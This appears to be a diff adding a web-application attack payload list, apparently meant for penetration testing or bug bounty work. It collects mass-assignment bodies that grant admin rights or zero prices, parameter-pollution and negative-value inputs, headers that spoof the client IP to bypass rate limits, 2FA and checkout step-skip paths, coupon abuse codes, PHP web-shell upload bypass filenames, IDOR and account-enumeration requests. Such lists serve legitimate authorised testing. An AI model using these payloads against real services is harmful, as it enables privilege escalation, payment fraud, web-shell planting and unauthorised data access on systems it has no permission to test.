@@ -1,0 +1,178 @@
+# ── Mass Assignment / Parameter Pollution ──
+# Add these to POST bodies to test mass assignment
+{"role":"admin"}
+{"isAdmin":true}
+{"is_admin":true}
+{"admin":true}
+{"user_type":"admin"}
+{"privilege":"admin"}
+{"access_level":9999}
+{"verified":true}
+{"email_verified":true}
+{"active":true}
+{"status":"active"}
+{"balance":999999}
+{"credit":999999}
+{"discount":100}
+{"price":0}
+{"price":0.01}
+{"quantity":-1}
+{"amount":-1}
+{"cost":0}
+{"free":true}
+{"premium":true}
+{"subscription":"premium"}
+{"plan":"enterprise"}
+{"group_id":1}
+{"org_id":1}
+{"account_type":"admin"}
+{"permissions":["admin","superuser"]}
+{"scopes":["admin","write","read"]}
+
+# ── HTTP Parameter Pollution ──
+?id=1&id=2
+?role=user&role=admin
+?admin=false&admin=true
+?price=100&price=0
+?quantity=1&quantity=-1
+
+# ── Business Logic - Negative Values ──
+?amount=-1
+?quantity=-1
+?price=-1
+?discount=101
+?coupon_discount=100
+?credit=-100
+?balance=-999
+
+# ── Business Logic - Zero / Boundary ──
+?amount=0
+?quantity=0
+?price=0
+?id=0
+?id=-1
+?id=99999999
+?id=2147483647
+?id=2147483648
+?page=0
+?page=-1
+?limit=0
+?limit=-1
+?limit=99999
+?offset=-1
+
+# ── Race Condition Endpoints ──
+/api/coupon/apply
+/api/voucher/redeem
+/api/transfer
+/api/withdraw
+/api/purchase
+/api/checkout
+/api/order
+/api/payment
+/api/vote
+/api/like
+/api/follow
+/api/referral/claim
+/api/bonus/claim
+/api/reward/claim
+/api/promo/apply
+
+# ── Rate Limit Bypass Headers ──
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: 1.2.3.4
+X-Real-IP: 127.0.0.1
+X-Real-IP: 1.2.3.4
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Forwarded: for=127.0.0.1
+X-Cluster-Client-IP: 127.0.0.1
+Fastly-Client-IP: 127.0.0.1
+
+# ── Insecure Workflow / Step Skip ──
+/checkout/step3
+/checkout/confirm
+/checkout/complete
+/order/confirm
+/payment/success
+/payment/complete
+/verify/skip
+/2fa/skip
+/email/verify/skip
+/onboarding/complete
+/setup/complete
+/wizard/finish
+
+# ── Coupon / Promo Abuse ──
+?coupon=ADMIN
+?coupon=FREE
+?coupon=TEST
+?coupon=DEBUG
+?coupon=INTERNAL
+?coupon=STAFF
+?promo=ADMIN
+?promo=FREE100
+?discount_code=ADMIN
+?voucher=ADMIN
+
+# ── File Upload Bypass ──
+# Double extension
+shell.php.jpg
+shell.php.png
+shell.php.gif
+shell.php.pdf
+shell.php5.jpg
+shell.phtml.jpg
+# Null byte
+shell.php%00.jpg
+shell.php\x00.jpg
+# MIME type bypass
+shell.php (with Content-Type: image/jpeg)
+# Case bypass
+shell.PHP
+shell.Php
+shell.pHp
+# Special extensions
+shell.php3
+shell.php4
+shell.php5
+shell.php7
+shell.phtml
+shell.pht
+shell.phps
+shell.phar
+shell.pgif
+shell.shtml
+shell.htaccess
+shell.svg
+# Polyglot
+shell.jpg.php
+shell.png.php
+
+# ── IDOR via Object Reference ──
+/api/export?user_id=1
+/api/export?user_id=2
+/api/report?id=1
+/api/report?id=2
+/api/invoice?id=1
+/api/invoice?id=2
+/download?file=user1_data.csv
+/download?file=user2_data.csv
+/api/backup?id=1
+/api/backup?id=2
+
+# ── Insecure Direct Object Reference - UUID ──
+/api/resource/00000000-0000-0000-0000-000000000001
+/api/resource/00000000-0000-0000-0000-000000000002
+/api/resource/11111111-1111-1111-1111-111111111111
+
+# ── Email / Username Enumeration ──
+/api/register (check response diff for existing vs new)
+/api/forgot-password (check response diff)
+/api/check-email?email=admin@admin.com
+/api/check-username?username=admin
+/api/user/exists?username=admin
